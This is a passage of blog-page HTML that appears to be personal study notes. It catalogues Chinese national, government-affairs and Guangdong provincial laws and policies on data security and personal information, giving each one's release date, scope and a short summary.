class="hljs-number">2016年11月7</span>日  <br><br>行业属性：全行业<br><br>有关概述：鼓励开发网络数据安全保护和利用技术。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《数据安全法》"><a href="#《数据安全法》" class="headerlink" title="《数据安全法》"></a>《数据安全法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年6月10</span>日  <br><br>行业属性：全行业<br><br>有关概述：数据安全领域的基础性法律<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《个人信息保护法》"><a href="#《个人信息保护法》" class="headerlink" title="《个人信息保护法》"></a>《个人信息保护法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年8月20</span>日  <br><br>行业属性：全行业<br><br>有关概述：保护个人信息权益，规范个人信息处理，促进个人信息利用<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《关键信息基础设施安全保护条例》"><a href="#《关键信息基础设施安全保护条例》" class="headerlink" title="《关键信息基础设施安全保护条例》"></a>《关键信息基础设施安全保护条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间<span class="hljs-number">2017年7月10</span>日<br><br>行业属性：全行业<br><br>有关概述：专门安全管理机构具体负责本单位的关键信息基础设施安全保护工作，履行个人信息和数据安全保护责任，建立健全个人信息和数据安全保护制度。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《征信业管理条例》"><a href="#《征信业管理条例》" class="headerlink" title="《征信业管理条例》"></a>《征信业管理条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2013年3月15</span><br><br>行业时间：全行业（针对征信方面的数据）<br><br>有关概述：征信机构按照规定，建立保证信息安全的规章制度，采取有效技术保证信息安全<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《关于运用大数据加强对市场主体服务和监管的若干意见》"><a href="#《关于运用大数据加强对市场主体服务和监管的若干意见》" class="headerlink" title="《关于运用大数据加强对市场主体服务和监管的若干意见》"></a>《关于运用大数据加强对市场主体服务和监管的若干意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2015年7月1</span>日<br><br>行业属性：全行业<br><br>有关概述：加强对涉及国家安全重要数据的管理，加强对大数据相关技术、设备和服务提供商的风险评估和安全管理。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《关于积极推进“互联网-”行动的指导意见》"><a href="#《关于积极推进“互联网-”行动的指导意见》" class="headerlink" title="《关于积极推进“互联网+”行动的指导意见》"></a>《关于积极推进“互联网+”行动的指导意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2015年7月4</span><br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：完善网络数据共享、利用等的安全管理和措施。探索数据安全流动认证体系，完善数据跨境流动管理制度，确保数据安全<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《商用密码管理条例》"><a href="#《商用密码管理条例》" class="headerlink" title="《商用密码管理条例》"></a>《商用密码管理条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">1999年10月7</span>日<br><br>行业属性：全行业<br><br>有关概述：加强商用密码管理，保护信息安全（包括数据概念的安全）<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《密码法》"><a href="#《密码法》" class="headerlink" title="《密码法》"></a>《密码法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2020年1月1</span>日<br><br>行业属性：全行业<br><br>有关概述：规定公民、法人和其他组织依法使用商用密码保护网络与数据安全<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网信息服务管理办法》"><a href="#《互联网信息服务管理办法》" class="headerlink" title="《互联网信息服务管理办法》"></a>《互联网信息服务管理办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2000年9月25</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：从事经营性互联网信息服务，应当有健全的网络与信息安全保障措施，包括网站安全保障措施、信息安全保密管理制度、用户信息安全管理制度。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网信息服务管理办法（修订草案征求意见稿）》"><a href="#《互联网信息服务管理办法（修订草案征求意见稿）》" class="headerlink" title="《互联网信息服务管理办法（修订草案征求意见稿）》"></a>《互联网信息服务管理办法（修订草案征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年1月8</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：互联网信息服务提供者、互联网网络接入服务提供者及其工作人员确保其收集的个人信息安全，防止所收集、使用的身份信息、日志信息泄露、毁损、丢失。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《建设高标准市场体系行动方案》"><a href="#《建设高标准市场体系行动方案》" class="headerlink" title="《建设高标准市场体系行动方案》"></a>《建设高标准市场体系行动方案》</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">发布时间：<span class="hljs-number">2021</span>年<span class="hljs-number">1</span>月<span class="hljs-number">31</span>日<br><br>行业属性：全行业<br><br>有关概述<span class="hljs-comment">; 加快培育发展数据要素市场。制定出台新一批数据共享责任清单，加强地区间、部门间数据共享交换。</span><br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网用户公众账号信息服务管理规定》"><a href="#《互联网用户公众账号信息服务管理规定》" class="headerlink" title="《互联网用户公众账号信息服务管理规定》"></a>《互联网用户公众账号信息服务管理规定》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年2月22</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：公众账号信息服务平台要履行企业主体责任，建立公众账号分级分类管理、生态治理、著作权保护、信用评价等制度，切实维护平台内容安全、账号安全、数据安全和个人信息安全。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《2021年政府工作报告》"><a href="#《2021年政府工作报告》" class="headerlink" title="《2021年政府工作报告》"></a>《2021年政府工作报告》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月5</span>日<br><br>行业有关概述：全行业（有提高政府建设水平）<br><br>有关概述：加快是数字化发展，打造数字经济优势，协同推进数字产业化和产业数字化转型。强调加强网络安全、数据安全和个人信息保护。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》"><a href="#《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》" class="headerlink" title="《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》"></a>《国民经济和社会发展地十四个五年规划和2035年远景目标纲要》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月12</span>日<br><br>行业属性：全行业<br><br>有关概述：提高数字政府建设水平，建立健全数据要素市场规则，加强网络安全保护，推动构建网络空间命运共同体。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《反间谍安全防范工作规定》"><a href="#《反间谍安全防范工作规定》" class="headerlink" title="《反间谍安全防范工作规定》"></a>《反间谍安全防范工作规定》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年4月26</span>日<br><br>行业属性：全行业<br><br>有关概述：采取反间谍技术安全防范措施，防范、制止境外网络攻击、网络入侵、网络窃密等间谍行为，保障网络和信息核心技术、关键基础设施和重要领域信息系统及数据的安全。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《常见类型移动互联网应用程序必要个人信息范围规定》"><a href="#《常见类型移动互联网应用程序必要个人信息范围规定》" class="headerlink" title="《常见类型移动互联网应用程序必要个人信息范围规定》"></a>《常见类型移动互联网应用程序必要个人信息范围规定》</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">发布时间：2021年5月1日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：规定明确了39种常见类型<span class="hljs-keyword">App</span>的必要个人信息范围，其中13类<span class="hljs-keyword">App</span>无须个人信息，即可使用基本功能服务。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《全国人民代表大会常务委员会工作报告》"><a href="#《全国人民代表大会常务委员会工作报告》" class="headerlink" title="《全国人民代表大会常务委员会工作报告》"></a>《全国人民代表大会常务委员会工作报告》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月8</span>日<br><br>行业属性：全行业<br><br>有关概述：加强个人信息保护，维护数据安全。在<span class="hljs-number">2021</span>年工作安排中指出，全面加强知识产权司法保护，加强知识产权法院建设，加大对“卡脖子”关键核心技术及新兴产业、重点领域、种源等保护力度，服务科技自立自强，服务科技强国建设<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《全国人大常委会2021年度工作要点》"><a href="#《全国人大常委会2021年度工作要点》" class="headerlink" title="《全国人大常委会2021年度工作要点》"></a>《全国人大常委会2021年度工作要点》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年5月14</span>日<br><br>行业属性：全行业<br><br>有关概述：健全现代化经济体系法律制度，制定数据安全法；加强民生保障、社会治理领域立法，制定个人信息保护法。健全国家安全法治体系。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《互联网信息服务算法推荐管理规定（征求意见稿）》"><a href="#《互联网信息服务算法推荐管理规定（征求意见稿）》" class="headerlink" title="《互联网信息服务算法推荐管理规定（征求意见稿）》"></a>《互联网信息服务算法推荐管理规定（征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年8月27</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：明确要求算法推荐服务提供者应当落实算法安全主体责任，建立健全用户注册、信息发布审核、算法机制机理审核、安全评估监测、安全事件应急处置、数据安全保护和个人信息保护等管理制度，制定并公开算法推荐相关服务规则，配备与算法推荐服务规模相适应的专业人员和技术支撑。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《“十四五”新型基础设施建设规划》"><a href="#《“十四五”新型基础设施建设规划》" class="headerlink" title="《“十四五”新型基础设施建设规划》"></a>《“十四五”新型基础设施建设规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年9月22</span>日<br><br>行业属性：全行业<br><br>有关概述：建立完善安全监管体系，增强安全保障能力。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《国家标准化发展纲要》"><a href="#《国家标准化发展纲要》" class="headerlink" title="《国家标准化发展纲要》"></a>《国家标准化发展纲要》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年10月10</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：规定互联网用户账号服务平台应当采取必要措施，确保其收集、存储的个人信息及账号名称信息安全；未经使用者授权同意，不得收集、存储、使用、加工、传输、提供或者公开个人信息及账号名称信息。不得非法买卖互联网用户账号名称信息。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《数据出境安全评估办法（征求意见稿）》"><a href="#《数据出境安全评估办法（征求意见稿）》" class="headerlink" title="《数据出境安全评估办法（征求意见稿）》"></a>《数据出境安全评估办法（征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年10月29</span>日<br><br>行业属性：全行业（针对出境范围的数据）<br><br>有关概述：旨在规范数据出境活动，保护个人信息权益，维护国家安全和社会公共利益，促进数据跨境安全、自由流动。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《网络数据安全管理条例（征求意见稿）》"><a href="#《网络数据安全管理条例（征求意见稿）》" class="headerlink" title="《网络数据安全管理条例（征求意见稿）》"></a>《网络数据安全管理条例（征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布日期：<span class="hljs-number">2021年11月14</span>日<br><br>行业属性：全行业<br><br>有关概述：根据《网络安全法》《数据安全法》《个人信息保护法》等法律，落实数据分级分类保护制度，对一般数据、个人信息、重要数据等如何保护给出了具体要求。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《国家安全战略》"><a href="#《国家安全战略》" class="headerlink" title="《国家安全战略》"></a>《国家安全战略》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年11月18</span>日<br><br>行业属性：全行业<br><br>有关概述：加快数据安全的治理能力<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《“十四五”推动高质量发展的国家标准体系建设规划》"><a href="#《“十四五”推动高质量发展的国家标准体系建设规划》" class="headerlink" title="《“十四五”推动高质量发展的国家标准体系建设规划》"></a>《“十四五”推动高质量发展的国家标准体系建设规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年12月14</span>日<br><br>行业属性：全行业<br><br>有关概述：提出推动关键信息基础设施安全保护、数据安全、个人信息保护、数据出境安全管理、网络安全审查、网络空间可信身份、网络产品和服务、供应链安全、<span class="hljs-number">5</span>G安全、智慧城市安全、物联网安全、工业互联网安全、车联网安全、人工智能安全等重点领域国家标准研制<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《“十四五”国家信息化规划》"><a href="#《“十四五”国家信息化规划》" class="headerlink" title="《“十四五”国家信息化规划》"></a>《“十四五”国家信息化规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年12月27</span>日<br><br>行业属性：全行业<br><br>有关概述：强化数据安全保障。加强数据收集、汇聚、存储、流通、应用等全生命周期的安全管理，建立健全相关技术保障措施。建立数据分类分级管理制度和个人信息保护认证制度，强化数据安全风险评估、监测预警、检测认证和应急处置，加强对重要数据、企业商业秘密和个人信息的保护，规范对未成年人个人信息的使用。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《网络安全审查办法》"><a href="#《网络安全审查办法》" class="headerlink" title="《网络安全审查办法》"></a>《网络安全审查办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2022年2月15</span>日<br><br>行业属性：全行业<br><br>有关概述：网络平台运营者开展数据处理活动影响或者可能影响国家安全等情形纳入网络安全审查范围，并明确要求掌握超过<span class="hljs-number">100</span>万用户个人信息的网络平台运营者赴国外上市必须申报网络安全审查<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-政务层面："><a href="#2-政务层面：" class="headerlink" title="2.政务层面："></a>2.政务层面：</h4><ul><li><h5 id="《政务信息资源共享管理暂行办法》"><a href="#《政务信息资源共享管理暂行办法》" class="headerlink" title="《政务信息资源共享管理暂行办法》"></a>《政务信息资源共享管理暂行办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间<span class="hljs-number">2016年9月19</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：共享平台管理单位要加强共享安全防护。切实保障政务信息资源共享交换时的数据安全<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于印发政府网站发展指引通知》"><a href="#《关于印发政府网站发展指引通知》" class="headerlink" title="《关于印发政府网站发展指引通知》"></a>《关于印发政府网站发展指引通知》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2017年6月8</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：加强网站平台的用户数据安全防护工作，建立政府网站信息数据安全保护制度、收集、使用用户信息数据应当遵循合法、正当、必要的原则<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于印发进一步深化“互联网-政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》"><a href="#《关于印发进一步深化“互联网-政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》" class="headerlink" title="《关于印发进一步深化“互联网+政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》"></a>《关于印发进一步深化“互联网+政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2018年6月22</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：要依法加强隐私等信息保护。研究政务信息资源分类分级制度，制定数据安全管理办法，明确数据采集、传输、存储、使用、共享、开放等环节安全保障的措施、责任主体和具体要求。<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于加快推进全国一体化在线服务平台建设的指导意见》"><a href="#《关于加快推进全国一体化在线服务平台建设的指导意见》" class="headerlink" title="《关于加快推进全国一体化在线服务平台建设的指导意见》"></a>《关于加快推进全国一体化在线服务平台建设的指导意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2019年8月8</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：强化数据使用方责任，加强共享数据使用全过程管理，确保数据安全。制定全国一体化在线政务服务平台数据安全管理办法，加强对涉及国家利益、公共安全、商业秘密、个人隐私等重要信息的保护和管理，加强政务大数据安全管理。<br></code></pre></td></tr></table></figure></li><li><h5 id="《国务院政务信息化项目建设管理办法》"><a href="#《国务院政务信息化项目建设管理办法》" class="headerlink" title="《国务院政务信息化项目建设管理办法》"></a>《国务院政务信息化项目建设管理办法》</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">发布时间<span class="hljs-comment">;2020年2月1日</span><br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：部门应当严格遵守有关保密等法律法规规定，构建全方位、多层次、一致性的防护体系，按要求采用密码技术，并定期开展密码应用安全性评估，确保政务信息系统运行安全和政务信息资源共享交换的数据安全。<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》"><a href="#《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》" class="headerlink" title="《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》"></a>《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2020年5月6</span>日<br><br>政务方向：档案局<br><br>有关概述：切实加强档案部门使用政务云平台过程中的档案信息安全管理<br></code></pre></td></tr></table></figure></li><li><h5 id="《人民检查院办理网络犯罪安全规定》"><a href="#《人民检查院办理网络犯罪安全规定》" class="headerlink" title="《人民检查院办理网络犯罪安全规定》"></a>《人民检查院办理网络犯罪安全规定》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年1月22</span>日<br><br>政务方向：人民检察院<br><br>有关概述：明确按照刑事诉讼流程规范网络犯罪案件办理，突出电子数据的收集、提取、审查的规范要求，注重办案与技术融合，突出统筹协作办案，充分发挥检察职能，全面提升检察机关办理网络犯罪案件的专业化水平，推进网络空间治理。<br></code></pre></td></tr></table></figure></li><li><h5 id="《涉密信息系统集成资质管理办法》"><a href="#《涉密信息系统集成资质管理办法》" class="headerlink" title="《涉密信息系统集成资质管理办法》"></a>《涉密信息系统集成资质管理办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月1</span>日<br><br>政务方向：保密局<br><br>有关概述：将涉密集成资质分为甲级和乙级两个等级，明确了涉密集成资质的申请、受理、审查、决定、使用和监督管理规定。<br></code></pre></td></tr></table></figure></li><li><h5 id="《全国一体化大数据中心协同创新体系算力枢纽实施方案》。"><a href="#《全国一体化大数据中心协同创新体系算力枢纽实施方案》。" class="headerlink" title="《全国一体化大数据中心协同创新体系算力枢纽实施方案》。"></a>《全国一体化大数据中心协同创新体系算力枢纽实施方案》。</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年5月24</span><br><br>政务方向：国务院下属部门（针对政务数据）<br></code></pre></td></tr></table></figure></li><li><h5 id="《全国一体化政务服务平台移动端建设指南》"><a href="#《全国一体化政务服务平台移动端建设指南》" class="headerlink" title="《全国一体化政务服务平台移动端建设指南》"></a>《全国一体化政务服务平台移动端建设指南》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年11月12</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：坚持安全可控工作原则。全面落实总体国家安全观，树牢网络安全底线思维，统筹发展和安全，增强移动政务服务一体化安全防护能力，加强对重要政务数据、敏感个人信息等的保护，确保政务网络和数据信息安全<br></code></pre></td></tr></table></figure></li><li><h5 id="《“十四五”推进国家政务信息化规划》"><a href="#《“十四五”推进国家政务信息化规划》" class="headerlink" title="《“十四五”推进国家政务信息化规划》"></a>《“十四五”推进国家政务信息化规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年12月24</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br></code></pre></td></tr></table></figure></li></ul><p><strong>小结（不一定对）：</strong>自我感觉分清政务行业层面和国家层面的主要依据是根据看法律法规对象的主体是谁，如果总体明显是各行业的数据内容，说明是国家层面对数据安全的发展规划和布局。对于政务行业层面而言，政务是指国家政府机构的事务性工作，也就是法律法规针对的对象是政府机构，例如国务院旗下的27个部门，他们对于政务信息数据的处理行为和方向。</p><h4 id="3-广东省层面："><a href="#3-广东省层面：" class="headerlink" title="3.广东省层面："></a>3.广东省层面：</h4><ul><li><h5 id="《广东省政务数据资源共享管理办法（试行）》"><a href="#《广东省政务数据资源共享管理办法（试行）》" class="headerlink" title="《广东省政务数据资源共享管理办法（试行）》"></a>《广东省政务数据资源共享管理办法（试行）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2019年1月1</span>日<br><br>归属：政务行业<br></code></pre></td></tr></table></figure></li><li><h5 id="《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》"><a href="#《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》" class="headerlink" title="《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》"></a>《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年7月22</span>日<br><br>归属：政务行业<br></code></pre></td></tr></table></figure></li><li><h5 id="《广东省数字经济促进条例》"><a href="#《广东省数字经济促进条例》" class="headerlink" title="《广东省数字经济促进条例》"></a>《广东省数字经济促进条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年9月1</span>日<br><br>归属:政务行业<br></code></pre></td></tr></table></figure></li><li><h5 id="《广东省公共数据安全管理办法（二次征求意见稿）》"><a href="#《广东省公共数据安全管理办法（二次征求意见稿）》" class="headerlink" title="《广东省公共数据安全管理办法（二次征求意见稿）》"></a>《广东省公共数据安全管理办法（二次征求意见稿）》</h5><figure class="highlight 